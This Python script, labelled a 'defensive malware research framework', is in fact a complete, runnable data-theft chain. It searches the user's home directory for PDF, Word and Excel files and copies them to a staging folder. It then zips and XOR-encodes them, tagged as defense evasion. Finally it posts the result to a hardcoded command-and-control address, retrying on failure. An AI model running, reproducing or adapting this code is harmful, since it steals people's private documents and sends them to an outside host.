#!/usr/bin/env python3
"""Merged Modules for Defensive Malware Research Framework"""

import sys
import json
import time
import os
import shutil
from typing import Dict, Any, List
from zipfile import ZipFile
import requests
from cryptography.hazmat.primitives.ciphers import Cipher, algorithms, modes
from cryptography.hazmat.backends import default_backend

def task_T1(input_data: Dict[str, Any] = None) -> Dict[str, Any]:
    start = time.time()
    input_data = input_data or {}
    try:
        # Define file extensions to search for
        file_extensions = ['.pdf', '.docx', '.xlsx']
        # Define the staging directory
        staging_dir = os.path.join(os.environ['TEMP'], 'staging')
        os.makedirs(staging_dir, exist_ok=True)

        # Initialize results
        file_paths: List[str] = []
        total_size = 0

        # Walk through the file system starting from the user's home directory
        for root, _, files in os.walk(os.path.expanduser('~')):
            for file in files:
                if any(file.endswith(ext) for ext in file_extensions):
                    full_path = os.path.join(root, file)
                    file_paths.append(full_path)
                    total_size += os.path.getsize(full_path)
                    # Copy the file to the staging directory
                    shutil.copy2(full_path, staging_dir)

        result = {
            'file_paths': file_paths,
            'total_size': total_size
        }
        return {'success': True, 'data': result,
                'metadata': {'task_id': 'T1', 'execution_time': time.time()-start}}
    except Exception as e:
        return {'success': False, 'error': f'{type(e).__name__}: {e}',
                'metadata': {'task_id': 'T1', 'execution_time': time.time()-start}}

def xor_encrypt(data: bytes, key: bytes) -> bytes:
    """XOR encrypt the data with the given key."""
    return bytes(b ^ key[i % len(key)] for i, b in enumerate(data))

def compress_files(file_paths: list) -> bytes:
    """Compress the given files into a zip archive and return the bytes."""
    zip_buffer = bytearray()
    with ZipFile('temp.zip', 'w') as zipf:
        for file_path in file_paths:
            if os.path.exists(file_path):
                zipf.write(file_path, os.path.basename(file_path))
    with open('temp.zip', 'rb') as f:
        zip_buffer.extend(f.read())
    os.remove('temp.zip')
    return bytes(zip_buffer)

def task_T2(input_data: Dict[str, Any] = None) -> Dict[str, Any]:
    start = time.time()
    input_data = input_data or {}
    try:
        file_paths = input_data.get('file_paths', [])
        total_size = input_data.get('total_size', 0)

        # Compress the files
        compressed_data = compress_files(file_paths)

        # XOR key (simple example key)
        xor_key = b'secretkey'

        # XOR encrypt the compressed data
        encoded_data = xor_encrypt(compressed_data, xor_key)

        # Prepare the result
        result = {
            'encoded_data': encoded_data.hex(),
            'encoding': 'xor'
        }

        return {'success': True, 'data': result,
                'metadata': {'task_id': 'T2', 'execution_time': time.time()-start}}
    except Exception as e:
        # Return partial result with fallback value
        return {'success': False, 'data': {'encoded_data': None, 'encoding': 'xor'},
                'error': f'{type(e).__name__}: {e}',
                'metadata': {'task_id': 'T2', 'execution_time': time.time()-start}}

def task_T3(input_data: Dict[str, Any] = None) -> Dict[str, Any]:
    start = time.time()
    input_data = input_data or {}
    c2_url = "https://192.168.142.222/api"
    max_attempts = 5
    attempts = 0
    success = False

    try:
        encoded_data = bytes.fromhex(input_data.get('encoded_data', ''))
        encoding = input_data.get('encoding', '')

        while attempts < max_attempts and not success:
            attempts += 1
            try:
                response = requests.post(c2_url, json={'data': encoded_data.hex(), 'encoding': encoding}, timeout=10)
                if response.status_code == 200:
                    success = True
            except requests.RequestException:
                time.sleep(1)  # Wait before retrying

        result = {'success': success, 'attempts': attempts}
        return {'success': True, 'data': result,
                'metadata': {'task_id': 'T3', 'execution_time': time.time()-start}}
    except Exception as e:
        return {'success': False, 'error': f'{type(e).__name__}: {e}',
                'metadata': {'task_id': 'T3', 'execution_time': time.time()-start}}

def main() -> dict:
    """Auto-generated orchestrator — do not edit by hand."""
    outputs: dict = {}
    results: dict = {}
    failed:  list = []
    
    # ── T1: Collect Sensitive Files [collection] ──
    try:
        r = task_T1(None)
        results['T1'] = r
        if r.get('success'):
            outputs['T1'] = r.get('data', {})
            print(f'[+] T1 (Collect Sensitive Files): OK')
        else:
            err = r.get('error', 'unknown')
            print(f'[-] T1 (Collect Sensitive Files): FAILED — {err}')
            failed.append('T1')
            print('[!] abort_mission — stopping')
            return {'success': False, 'failed': failed, 'outputs': outputs, 'results': results}
    except Exception as e:
        print(f'[!] T1 crashed: {e}')
        failed.append('T1')
        results['T1'] = {'success': False, 'error': str(e)}
        return {'success': False, 'failed': failed, 'outputs': outputs, 'results': results}
    
    # ── T2: Compress and Encode Files [defense-evasion] ──
    try:
        r = task_T2(outputs.get('T1', {}))
        results['T2'] = r
        if r.get('success'):
            outputs['T2'] = r.get('data', {})
            print(f'[+] T2 (Compress and Encode Files): OK')
        else:
            err = r.get('error', 'unknown')
            print(f'[-] T2 (Compress and Encode Files): FAILED — {err}')
            failed.append('T2')
    except Exception as e:
        print(f'[!] T2 crashed: {e}')
        failed.append('T2')
        results['T2'] = {'success': False, 'error': str(e)}
    
    # ── T3: Exfiltrate Encoded Data [exfiltration] ──
    try:
        r = task_T3(outputs.get('T2', {}))
        results['T3'] = r
        if r.get('success'):
            outputs['T3'] = r.get('data', {})
            print(f'[+] T3 (Exfiltrate Encoded Data): OK')
        else:
            err = r.get('error', 'unknown')
            print(f'[-] T3 (Exfiltrate Encoded Data): FAILED — {err}')
            failed.append('T3')
            r2 = task_T3(outputs.get('T2', {}))
            if r2.get('success'):
                outputs['T3'] = r2.get('data', {})
                failed.remove('T3')
    except Exception as e:
        print(f'[!] T3 crashed: {e}')
        failed.append('T3')
        results['T3'] = {'success': False, 'error': str(e)}
    
    success = len(failed) == 0
    if success:
        print('[+] All tasks completed successfully')
    else:
        print(f'[-] Failed tasks: {failed}')
    return {'success': success, 'failed': failed,
            'outputs': outputs, 'results': results}

if __name__ == '__main__':
    import json
    result = main()
    print('__RESULT__=' + json.dumps(result))